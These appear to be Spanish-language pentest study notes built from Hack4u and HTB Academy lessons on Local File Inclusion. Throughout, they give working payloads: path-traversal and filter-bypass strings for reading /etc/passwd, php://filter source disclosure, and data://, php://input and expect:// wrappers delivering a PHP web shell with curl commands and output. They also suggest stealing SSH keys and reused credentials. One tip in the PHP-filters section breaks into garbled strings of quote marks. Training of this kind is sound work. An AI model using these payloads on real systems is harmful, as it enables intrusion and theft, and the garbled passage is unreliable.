---
tags:
  - Explotacion
  - Web
---
[[0️⃣​ - File Inclusion]] 

# Notas

Hay técnicas para que nos de la información que nosotros queramos como por ejemplo:

## Path Traversal

```
http://localhost/index.php?filename=../../../../etc/passwd
```

Si tiene restricciones por debajo podemos probar de la siguiente manera

```
http://localhost/index.php?filename=....//....//....//....//etc/passwd
```

## Null bite

Esta técnica sirve para **versiones de php antiguas** y seria de tal manera que le poner un valor nulo justo después del nombre del archivo ya que por debajo esta validando que tiene una extensión x. Pero al ponerle el valor nulo se salta la validación.

```
http://localhost/index.php?filename=../../../../etc/passwd%00
```

## Wrappers

Podemos con los wrappers envolver la información de salida para que se salte algunas de las validaciones que por debajo están funcionando.

Si apuntamos a un php nos lo va a interpretar y a menudo nos interesaría ver que tiene dentro, por lo que con los wrappers podemos realizar técnicas para verlo.

### php
#### base64

```
php://filter/convert.base64-encode/resource=index.php
```

### Ejecución de comandos

Esto se realiza en las peticiones http/https:

#### expect://

```http
GET /?filename=expect://whoami HTTP/1.1
...
```

#### php://input

Nos permite mandar datos en la petición de esta manera:

```http
GET /?filename=php://input HTTP/1.1
...
<?php system('whoami'); ?>
```

#### data://

Esto nos permite enviar comandos ingresando la cadena en base64.

Lo siguiente lo pasamos a base64 y lo ingresamos al final del wrapper
	<?php system("whoami"); ?>

```http
GET /?filename=data://text/plain;base64,ngfsiluhfguiosdhbfdaisj= HTTP/1.1
```

Con esto podemos realizar lo siguiente para ingresar los comandos con más comodidad

Encodeamos lo siguiente -> <?php system("cmd"); ?>

```http
GET /?filename=data://text/plain;base64,ngfsiluhfguiosdhbfdaisj&cmd=whaomi HTTP/1.1
```

#### Codear y encodear

Podemos con una técnica de codear y decodear escribir en un fichero lo que nosotros queramos y por ello ganar control en la máquina.

Hay una herramienta que te automatiza el hecho de escribir que es la siguiente

- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)
```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

Esto nos saca una cadena, la copiamos y la ingresamos en la cadena en el navegador en el valor del parámetro.

# Hack4u

La vulnerabilidad **Local File Inclusion** (**LFI**) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web **no valida adecuadamente** las entradas de usuario, permitiendo a un atacante **acceder a archivos locales** en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como “**Path Traversal**” y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir “**../**” en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

Para prevenir los ataques LFI, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario, limitando el acceso a los recursos del sistema y asegurándose de que los archivos sólo se puedan incluir desde ubicaciones permitidas. Además, las empresas deben implementar medidas de seguridad adecuadas, como el cifrado de archivos y la limitación del acceso de usuarios no autorizados a los recursos del sistema.

A continuación, se os proporciona el enlace directo a la herramienta que utilizamos al final de esta clase para abusar de los ‘**Filter Chains**‘ y conseguir así ejecución remota de comandos:

- **PHP Filter Chain Generator**: [https://github.com/synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)


# HTB Academy
## Identificación de la vulnerabilidad


La siguiente tabla muestra qué funciones pueden ejecutar archivos y qué solo lee el contenido del archivo:

| **Función**                  | **Leer Contenido** | **Ejecutar** | **URL remota** |
| ---------------------------- | :----------------: | :----------: | :------------: |
| **PHP**                      |                    |              |                |
| `include()`/`include_once()` |         ✅          |      ✅       |       ✅        |
| `require()`/`require_once()` |         ✅          |      ✅       |       ❌        |
| `file_get_contents()`        |         ✅          |      ❌       |       ✅        |
| `fopen()`/`file()`           |         ✅          |      ❌       |       ❌        |
| **NodeJS**                   |                    |              |                |
| `fs.readFile()`              |         ✅          |      ❌       |       ❌        |
| `fs.sendFile()`              |         ✅          |      ❌       |       ❌        |
| `res.render()`               |         ✅          |      ✅       |       ❌        |
| **Java**                     |                    |              |                |
| `include`                    |         ✅          |      ❌       |       ❌        |
| `import`                     |         ✅          |      ✅       |       ✅        |
| **.NET**                     |                    |              |                |
| `@Html.Partial()`            |         ✅          |      ❌       |       ❌        |
| `@Html.RemotePartial()`      |         ✅          |      ❌       |       ✅        |
| `Response.WriteFile()`       |         ✅          |      ❌       |       ❌        |
| `include`                    |         ✅          |      ✅       |       ✅        |

Esta es una diferencia significativa a tener en cuenta, ya que la ejecución de archivos puede permitirnos ejecutar funciones y eventualmente conducir a la ejecución de código, mientras que solo leer el contenido del archivo solo nos permitiría leer el código fuente sin ejecución de código. Además, si tuvimos acceso al código fuente en un ejercicio de caja blanca o en una auditoría de código, conocer estas acciones nos ayuda a identificar posibles vulnerabilidades de Inclusión de archivos, especialmente si tenían entrada controlada por el usuario.


## LFI Básico

El ejercicio que tenemos al final de esta sección nos muestra un ejemplo de una aplicación web que permite a los usuarios configurar su idioma en Inglés o Español:

```
http://<SERVER_IP>:<PORT>/
```
   

![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang.png)

Si seleccionamos un idioma haciendo clic en él (por ejemplo. `Spanish`), vemos que el texto del contenido cambia al español:

```
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```
   

![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_es.png)

También notamos que la URL incluye un `language` parámetro que ahora se establece en el idioma que seleccionamos (`es.php`). Hay varias formas en que se puede cambiar el contenido para que coincida con el idioma que especificamos. Puede estar extrayendo el contenido de una tabla de base de datos diferente según el parámetro especificado, o puede estar cargando una versión completamente diferente de la aplicación web. Sin embargo, como se discutió anteriormente, cargar parte de la página usando motores de plantilla es el método más fácil y común utilizado.

Por lo tanto, si la aplicación web está tirando de un archivo que ahora se está incluyendo en la página, es posible que podamos cambiar el archivo que se extrae para leer el contenido de un archivo local diferente. Dos archivos legibles comunes que están disponibles en la mayoría de los servidores de back-end son `/etc/passwd` en Linux y `C:\Windows\boot.ini` en Windows. Entonces, cambiemos el parámetro de `es` a `/etc/passwd`:


```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```


![](https://academy.hackthebox.com/storage/modules/23/basic_lfi_lang_passwd.png)

Como podemos ver, la página es realmente vulnerable, y podemos leer el contenido de la `passwd` archive e identifique qué usuarios existen en el servidor de back-end.

---

### Path Traversal

En el ejemplo anterior, leemos un archivo especificando su `absolute path` (p. ej. `/etc/passwd`). Esto funcionaría si se usara toda la entrada dentro del `include()` función sin adiciones, como el siguiente ejemplo:

```php
include($_GET['language']);
```

En este caso, si tratamos de leer `/etc/passwd`, entonces el `include()` la función buscaría ese archivo directamente. Sin embargo, en muchas ocasiones, los desarrolladores web pueden agregar o anteponer una cadena al `language` parámetro. Por ejemplo, el `language` el parámetro se puede usar para el nombre de archivo y se puede agregar después de un directorio, de la siguiente manera:

```php
include("./languages/" . $_GET['language']);
```

En este caso, si intentamos leer `/etc/passwd`, entonces el camino pasó a `include()` sería (`./languages//etc/passwd`), y como este archivo no existe, no podremos leer nada

Podemos evitar fácilmente esta restricción atravesando directorios usando `relative paths`. Para hacerlo, podemos agregar `../` antes de nuestro nombre de archivo, que se refiere al directorio principal. Por ejemplo, si la ruta completa del directorio de idiomas es `/var/www/html/languages/`, luego usando `../index.php` se referiría a la `index.php` archivo en el directorio principal (es decir. `/var/www/html/index.php`).

Entonces, podemos usar este truco para retroceder varios directorios hasta que alcancemos la ruta raíz (es decir. `/`), y luego especifique nuestra ruta de archivo absoluta (por ejemplo. `../../../../etc/passwd`), y el archivo debe existir:


```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```



### Filename Prefix

En nuestro ejemplo anterior, usamos el `language` parámetro después del directorio, así que podríamos atravesar la ruta para leer el `passwd` archivo. En algunas ocasiones, nuestra entrada se puede agregar después de una cadena diferente. Por ejemplo, se puede usar con un prefijo para obtener el nombre de archivo completo, como en el siguiente ejemplo:

```php
include("lang_" . $_GET['language']);
```

En este caso, si intentamos atravesar el directorio con `../../../etc/passwd`, la cuerda final sería `lang_../../../etc/passwd`, que no es válido

Como era de esperar, el error nos dice que este archivo no existe, por lo que, en lugar de utilizar directamente el recorrido de ruta, podemos prefijar un archivo `/` antes de nuestra carga útil, y esto debería considerar el prefijo como un directorio, y luego deberíamos omitir el nombre del archivo y poder atravesar directorios

>**Nota:** 
>Esto puede no funcionar siempre, como en este ejemplo un directorio llamado `lang_/` puede que no exista, por lo que nuestro camino relativo puede no ser correcto. Además, `any prefix appended to our input may break some file inclusion techniques` discutiremos en las próximas secciones, como el uso de envoltorios y filtros PHP o RFI.

### Appended Extensions

Otro ejemplo muy común es cuando se añade una extensión al `language` parámetro, como sigue:

```php
include($_GET['language'] . ".php");
```

Esto es bastante común, ya que en este caso, no tendríamos que escribir la extensión cada vez que necesitemos cambiar el idioma. Esto también puede ser más seguro, ya que puede restringirnos a incluir solo archivos PHP. En este caso, si tratamos de leer `/etc/passwd`, entonces el archivo incluido sería `/etc/passwd.php`, que no existe


Hay varias técnicas que podemos usar para evitar esto, y las discutiremos en las próximas secciones.


### Second-Order Attacks

Como podemos ver, los ataques LFI pueden venir en diferentes formas. Otro ataque LFI común y un poco más avanzado es un `Second Order Attack`. Esto ocurre porque muchas funcionalidades de aplicaciones web pueden estar extrayendo inseguramente archivos del servidor de back-end en función de los parámetros controlados por el usuario.

Por ejemplo, una aplicación web puede permitirnos descargar nuestro avatar a través de una URL como (`/profile/$username/avatar.png`). Si creamos un nombre de usuario LFI malicioso (por ejemplo. `../../../etc/passwd`), entonces puede ser posible cambiar el archivo que se tira a otro archivo local en el servidor y agarrarlo en lugar de nuestro avatar.

En este caso, estaríamos envenenando una entrada de base de datos con una carga útil LFI maliciosa en nuestro nombre de usuario. Luego, otra funcionalidad de aplicación web utilizaría esta entrada envenenada para realizar nuestro ataque (es decir, descargar nuestro avatar basado en el valor del nombre de usuario). Es por eso que este ataque se llama un `Second-Order` ataque.

Los desarrolladores a menudo pasan por alto estas vulnerabilidades, ya que pueden proteger contra la entrada directa del usuario (por ejemplo, de un `?page` parámetro), pero pueden confiar en los valores extraídos de su base de datos, como nuestro nombre de usuario en este caso. Si logramos envenenar nuestro nombre de usuario durante nuestro registro, entonces el ataque sería posible.

Explotar vulnerabilidades LFI utilizando ataques de segundo orden es similar a lo que hemos discutido en esta sección. La única variación es que necesitamos detectar una función que extrae un archivo en función de un valor que controlamos indirectamente y luego tratar de controlar ese valor para explotar la vulnerabilidad.

>**Nota:**
>Todas las técnicas mencionadas en esta sección deben funcionar con cualquier vulnerabilidad LFI, independientemente del lenguaje o marco de desarrollo de back-end.

## LFI Bypasses

### Non-Recursive Path Traversal Filters

Uno de los filtros más básicos contra LFI es un filtro de búsqueda y reemplazo, donde simplemente elimina las subcadenas de (`../`) para evitar los recorridos de ruta. Por ejemplo:


```php
$language = str_replace('../', '', $_GET['language']);
```

La siguiente ruta no serviría:

```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

Solución:

```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```


### Encoding

Algunos filtros web pueden evitar los filtros de entrada que incluyen ciertos caracteres relacionados con LFI, como un punto `.` o una barra `/` utilizado para los recorridos de caminos. Sin embargo, algunos de estos filtros pueden omitirse mediante la codificación de URL de nuestra entrada, de modo que ya no incluiría estos caracteres incorrectos, pero aún así se decodificaría a nuestra cadena de paso de ruta una vez que alcance la función vulnerable. Los filtros PHP principales en las versiones 5.3.4 y anteriores eran específicamente vulnerables a este bypass, pero incluso en las versiones más recientes podemos encontrar filtros personalizados que pueden omitirse a través de la codificación URL.

Si la aplicación web de destino no lo permitió `.` y `/` en nuestra entrada, podemos codificar URL `../` en `%2e%2e%2f`, que puede pasar por alto el filtro. Para ello, podemos utilizar cualquier utilidad de codificador de URL en línea o utilizar la herramienta Burp Suite Decoder, de la siguiente manera: ![burp_url_encode](https://academy.hackthebox.com/storage/modules/23/burp_url_encode.jpg)

>**Nota:** 
>Para que esto funcione debemos codificar URL todos los caracteres, incluyendo los puntos. Algunos codificadores de URL pueden no codificar puntos, ya que se consideran parte del esquema de URL.

### Approved Paths

Algunas aplicaciones web también pueden usar Expresiones regulares para asegurarse de que el archivo que se incluye está bajo una ruta específica. Por ejemplo, la aplicación web con la que hemos estado tratando solo puede aceptar rutas que están debajo del `./languages` directorio, de la siguiente manera:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

Para encontrar la ruta aprobada, podemos examinar las solicitudes enviadas por los formularios existentes y ver qué ruta utilizan para la funcionalidad web normal. Además, podemos fuzz directorios web bajo el mismo camino, y probar diferentes hasta que obtengamos una coincidencia. Para evitar esto, podemos usar el recorrido de la ruta y comenzar nuestra carga útil con la ruta aprobada, y luego usar `../` para volver al directorio raíz y leer el archivo que especificamos, de la siguiente manera:


```
<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```




### Appended Extension

Como se discutió en la sección anterior, algunas aplicaciones web añaden una extensión a nuestra cadena de entrada (por ejemplo. `.php`), para asegurar que el archivo que incluimos está en la extensión esperada. Con las versiones modernas de PHP, es posible que no podamos evitar esto y nos limitaremos a leer solo archivos en esa extensión, lo que aún puede ser útil, como veremos en la siguiente sección (por ejemplo, para leer código fuente).

Hay un par de otras técnicas que podemos usar, pero lo son `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`. Sin embargo, aún puede ser beneficioso mencionarlos, ya que algunas aplicaciones web aún pueden estar ejecutándose en servidores más antiguos, y estas técnicas pueden ser las únicas omisiones posibles.

#### Path Truncation

En versiones anteriores de PHP, las cadenas definidas tienen una longitud máxima de 4096 caracteres, probablemente debido a la limitación de los sistemas de 32 bits. Si se pasa una cadena más larga, simplemente lo será `truncated`, y cualquier carácter después de la longitud máxima será ignorado. Además, PHP también se utiliza para eliminar barras de seguimiento y puntos individuales en los nombres de ruta, por lo que si llamamos (`/etc/passwd/.`) entonces el `/.` también sería truncado, y PHP llamaría (`/etc/passwd`). PHP y los sistemas Linux en general, también ignoran múltiples barras en la ruta (por ejemplo. `////etc/passwd` es lo mismo que `/etc/passwd`). Del mismo modo, un acceso directo de directorio actual (`.`) en el medio del camino también sería ignorado (p. ej. `/etc/./passwd`).

Si combinamos ambas limitaciones de PHP, podemos crear cadenas muy largas que evalúan una ruta correcta. Cada vez que alcanzamos la limitación de 4096 caracteres, la extensión adjunta (`.php`) sería truncado, y tendríamos un camino sin una extensión adjunta. Por último, también es importante tener en cuenta que también tendríamos que hacerlo `start the path with a non-existing directory` para que esta técnica funcione.

Un ejemplo de dicha carga útil sería el siguiente:

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Por supuesto, no tenemos que escribir manualmente `./` 2048 Veces (total de 4096 caracteres), pero podemos automatizar la creación de esta cadena con el siguiente comando:

  Bypass Básicos

```shell-session
vcrdcr@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

También podemos aumentar el recuento de `../`, como agregar más todavía nos aterrizaría en el directorio raíz, como se explica en la sección anterior. Sin embargo, si utilizamos este método, debemos calcular la longitud total de la cadena para garantizar solo `.php` se trunca y no nuestro archivo solicitado al final de la cadena (`/etc/passwd`). Es por eso que sería más fácil usar el primer método.

#### Null Bytes

Las versiones de PHP anteriores a 5.5 eran vulnerables a `null byte injection`, lo que significa que añadir un byte nulo (`%00`) al final de la cadena terminaría la cadena y no consideraría nada después de ella. Esto se debe a cómo se almacenan las cadenas en la memoria de bajo nivel, donde las cadenas en la memoria deben usar un byte nulo para indicar el final de la cadena, como se ve en los idiomas Assembly, C o C++.

Para explotar esta vulnerabilidad, podemos finalizar nuestra carga útil con un byte nulo (por ejemplo. `/etc/passwd%00`), de tal manera que el camino final pasó a `include()` sería (`/etc/passwd%00.php`). De esta manera, aunque `.php` se agrega a nuestra cadena, cualquier cosa después del byte nulo se truncaría, por lo que el camino utilizado realmente sería `/etc/passwd`, lo que nos lleva a evitar la extensión adjunta.



## PHP Filters

### Filtros de Entrada

[Filtros PHP](https://www.php.net/manual/en/filters.php) son un tipo de envoltorios PHP, donde podemos pasar diferentes tipos de entrada y tenerla filtrada por el filtro que especificamos. Para usar flujos de envoltura PHP, podemos usar el `php://` esquema en nuestra cadena, y podemos acceder a la envoltura de filtro PHP con `php://filter/`.

El `filter` wrapper tiene varios parámetros, pero los principales que requerimos para nuestro ataque son `resource` y `read`. El `resource` el parámetro es necesario para los envoltorios de filtro, y con él podemos especificar el flujo en el que nos gustaría aplicar el filtro (por ejemplo, un archivo local), mientras que el `read` parameter puede aplicar diferentes filtros en el recurso de entrada, por lo que podemos usarlo para especificar qué filtro queremos aplicar en nuestro recurso.

Hay cuatro tipos diferentes de filtros disponibles para su uso, que son [Filtros de Cuerda](https://www.php.net/manual/en/filters.string.php), [Filtros de Conversión](https://www.php.net/manual/en/filters.convert.php), [Filtros de Compresión](https://www.php.net/manual/en/filters.compression.php), y [Filtros de Cifrado](https://www.php.net/manual/en/filters.encryption.php). Puede leer más sobre cada filtro en su enlace respectivo, pero el filtro que es útil para los ataques LFI es el `convert.base64-encode` filtro, debajo `Conversion Filters`.


### Fuzzing para Archivos PHP

El primer paso sería fuzz para diferentes páginas PHP disponibles con una herramienta como `ffuf` o `gobuster`, como se cubre en el [Atacar Aplicaciones Web con Ffuf](https://academy.hackthebox.com/module/details/54) módulo:

  Filtros PHP

```shell-session
vcrdcr@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

**Consejo:** A diferencia del uso normal de la aplicación web, no estamos restringidos a páginas con código de respuesta HTTP 200, ya que tenemos acceso local a la inclusión de archivos, por lo que deberíamos buscar todos los códigos, incluidas las páginas ur301b, ''' '' '' '' '' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' ' '

Incluso después de leer las fuentes de cualquier archivo identificado, podemos `scan them for other referenced PHP files`y luego lea también, hasta que podamos capturar la mayor parte de la fuente de la aplicación web o tener una imagen precisa de lo que hace. También es posible comenzar leyendo `index.php` y escanearlo en busca de más referencias, etc., pero fuzzing para archivos PHP puede revelar algunos archivos que de otra manera no se pueden encontrar de esa manera.

### Inclusión Estándar de PHP

En secciones anteriores, si intentó incluir archivos php a través de LFI, habría notado que el archivo PHP incluido se ejecuta y, finalmente, se representa como una página HTML normal. Por ejemplo, intentemos incluir el `config.php` página (`.php` extensión adjunta por aplicación web):

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_config_failed.png)

Como podemos ver, obtenemos un resultado vacío en lugar de nuestra cadena LFI, ya que el `config.php` lo más probable es que solo configure la configuración de la aplicación web y no represente ninguna salida HTML.

Esto puede ser útil en ciertos casos, como acceder a páginas PHP locales sobre las que no tenemos acceso (es decir. SSRF), pero en la mayoría de los casos, estaríamos más interesados en leer el código fuente de PHP a través de LFI, ya que los códigos fuente tienden a revelar información importante sobre la aplicación web. Aquí es donde el `base64` el filtro php se vuelve útil, ya que podemos usarlo para codificar base64 el archivo php, y luego obtendríamos el código fuente codificado en lugar de ejecutarlo y renderizarlo. Esto es especialmente útil para los casos en los que estamos tratando con LFI con extensiones PHP adjuntas, porque podemos estar restringidos a incluir solo archivos PHP, como se discutió en la sección anterior.

**Nota:** Lo mismo se aplica a los lenguajes de aplicaciones web que no sean PHP, siempre que la función vulnerable pueda ejecutar archivos. De lo contrario, obtendríamos directamente el código fuente y no necesitaríamos usar filtros/funciones adicionales para leer el código fuente. Consulte la tabla de funciones de la sección 1 para ver qué funciones tienen qué privilegios.

### Divulgación del Código Fuente

Una vez que tengamos una lista de posibles archivos PHP que queremos leer, podemos comenzar a revelar sus fuentes con el `base64` Filtro PHP. Intentemos leer el código fuente de `config.php` usando el filtro base64, especificando `convert.base64-encode` para el `read` parámetro y `config` para el `resource` parámetro, como sigue:

Código: url

```url
php://filter/read=convert.base64-encode/resource=config
```

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)

>**Nota:** 
>Dejamos intencionalmente el archivo de recursos al final de nuestra cadena, como el `.php` la extensión se agrega automáticamente al final de nuestra cadena de entrada, lo que haría que el recurso que especificamos sea `config.php`.

Como podemos ver, a diferencia de nuestro intento con LFI regular, el uso del filtro base64 devolvió una cadena codificada en lugar del resultado vacío que vimos anteriormente. Ahora podemos decodificar esta cadena para obtener el contenido del código fuente de `config.php`, como sigue:

  Filtros PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```

**Consejo:** Al copiar la cadena codificada base64, asegúrese de copiar toda la cadena o no se decodificará por completo. Puede ver la fuente de la página para asegurarse de copiar toda la cadena.

Ahora podemos investigar este archivo en busca de información confidencial como credenciales o claves de base de datos y comenzar a identificar más referencias y luego divulgar sus fuentes.

## PHP Wrappers

Podemos usar muchos métodos para ejecutar comandos remotos, cada uno de los cuales tiene un caso de uso específico, ya que dependen del lenguaje/marco de back-end y las capacidades de la función vulnerable. Un método fácil y común para obtener control sobre el servidor de back-end es enumerar las credenciales de usuario y las claves SSH, y luego usarlas para iniciar sesión en el servidor de back-end a través de SSH o cualquier otra sesión remota. Por ejemplo, podemos encontrar la contraseña de la base de datos en un archivo como `config.php`, que puede coincidir con la contraseña de un usuario en caso de que reutilice la misma contraseña. O podemos comprobar el `.ssh` directorio en el directorio de inicio de cada usuario, y si los privilegios de lectura no están configurados correctamente, entonces podemos obtener su clave privada (`id_rsa`) y úselo a SSH en el sistema.

Aparte de tales métodos triviales, hay formas de lograr la ejecución remota de código directamente a través de la función vulnerable sin depender de la enumeración de datos o privilegios de archivos locales. En esta sección, comenzaremos con la ejecución remota de código en aplicaciones web PHP. Construiremos sobre lo que aprendimos en la sección anterior, y utilizaremos diferentes `PHP Wrappers` para obtener la ejecución remota de código. Luego, en las próximas secciones, aprenderemos otros métodos para obtener la ejecución remota de código que también se puede usar con PHP y otros lenguajes.

### Datos

El [datos](https://www.php.net/manual/en/wrappers.data.php) wrapper se puede utilizar para incluir datos externos, incluido el código PHP. Sin embargo, el envoltorio de datos solo está disponible para usar si el (`allow_url_include`) la configuración está habilitada en las configuraciones de PHP. Entonces, primero confirmemos si esta configuración está habilitada, leyendo el archivo de configuración de PHP a través de la vulnerabilidad LFI.

### Comprobación de configuración PHP

Para hacerlo, podemos incluir el archivo de configuración de PHP que se encuentra en (`/etc/php/X.Y/apache2/php.ini`) para Apache o en (`/etc/php/X.Y/fpm/php.ini`) para Nginx, donde `X.Y` es su versión de instalación de PHP.

Podemos comenzar con la última versión de PHP y probar versiones anteriores si no pudimos localizar el archivo de configuración.

También usaremos el `base64` filtro que utilizamos en la sección anterior, como `.ini` los archivos son similares a `.php` archivos y deben ser codificados para evitar romperse.

Finalmente, usaremos cURL o Burp en lugar de un navegador, ya que la cadena de salida podría ser muy larga y deberíamos poder capturarla correctamente

```shell-session
vcrdcr@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Una vez que tengamos la cadena codificada base64, podemos decodificarla y `grep` para `allow_url_include` para ver su valor:

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

### Ejecución remota de código (GET)

Con `allow_url_include` habilitado, podemos proceder con nuestro `data` ataque de envoltura. Como se mencionó anteriormente, el `data` wrapper se puede utilizar para incluir datos externos, incluido el código PHP. También podemos pasarlo `base64` cadenas codificadas con `text/plain;base64`, y tiene la capacidad de decodificarlos y ejecutar el código PHP.

Por lo tanto, nuestro primer paso sería basar64 codificar un shell web PHP básico, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Ahora, podemos codificar URL la cadena base64 y luego pasarla al contenedor de datos con `data://text/plain;base64,`. Finalmente, podemos usar comandos de pase al shell web con `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```


![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)



También podemos usar cURL para el mismo ataque, de la siguiente manera:

```shell-session
vcrdcr@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Input (POST)

Similar a la `data` envoltura, el [entrada](https://www.php.net/manual/en/wrappers.php.php) wrapper se puede utilizar para incluir entrada externa y ejecutar código PHP. La diferencia entre él y el `data` wrapper es que pasamos nuestra entrada a la `input` wrapper como datos de una solicitud POST. Por lo tanto, el parámetro vulnerable debe aceptar solicitudes POST para que este ataque funcione. Finalmente, el `input` la envoltura también depende de la `allow_url_include` configuración, como se mencionó anteriormente.

Para repetir nuestro ataque anterior pero con el `input` wrapper, podemos enviar una solicitud POST a la URL vulnerable y agregar nuestro shell web como datos POST. Para ejecutar un comando, lo pasaríamos como un parámetro GET, como lo hicimos en nuestro ataque anterior:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Nota:** Para pasar nuestro comando como una solicitud GET, necesitamos la función vulnerable para aceptar también la solicitud GET (es decir, el uso `$_REQUEST`). Si solo acepta solicitudes POST, entonces podemos poner nuestro comando directamente en nuestro código PHP, en lugar de un shell web dinámico (por ejemplo. `<\?php system('id')?>`)

### Expect

Finalmente, podemos utilizar el [esperar](https://www.php.net/manual/en/wrappers.expect.php) wrapper, que nos permite ejecutar comandos directamente a través de flujos de URL. Expect funciona de manera muy similar a los shells web que hemos utilizado anteriormente, pero no es necesario proporcionar un shell web, ya que está diseñado para ejecutar comandos.

Sin embargo, expect es un envoltorio externo, por lo que debe instalarse y habilitarse manualmente en el servidor de back-end, aunque algunas aplicaciones web dependen de él para su funcionalidad principal, por lo que podemos encontrarlo en casos específicos. Podemos determinar si está instalado en el servidor de back-end como lo hicimos con `allow_url_include` antes, pero lo haríamos `grep` para `expect` en cambio, y si está instalado y habilitado, obtendríamos lo siguiente:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

Como podemos ver, el `extension` la palabra clave de configuración se utiliza para habilitar el `expect` módulo, lo que significa que deberíamos poder usarlo para obtener RCE a través de la vulnerabilidad LFI. Para usar el módulo expect, podemos usar el `expect://` envolver y luego pasar el comando que queremos ejecutar, de la siguiente manera:

  Envolturas PHP

```shell-session
vcrdcr@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```




# Automated Scanning

## Parámetros de Fuzzing

Los formularios HTML que los usuarios pueden usar en el front-end de la aplicación web tienden a probarse adecuadamente y estar bien protegidos contra diferentes ataques web. 

Sin embargo, en muchos casos, la página puede tener otros parámetros expuestos que no están vinculados a ningún formulario HTML y, por lo tanto, los usuarios normales nunca accederían o causarían daños involuntarios. 

Es por eso que puede ser importante fuzz para los parámetros expuestos, ya que tienden a no ser tan seguros como los públicos.


El [Atacar Aplicaciones Web con Ffuf](https://academy.hackthebox.com/module/details/54) el módulo entra en detalles sobre cómo podemos fuzz para `GET`/`POST` parámetros. Por ejemplo, podemos fuzz la página para común `GET` parámetros, como sigue:

  Escaneo Automatizado

```shell-session
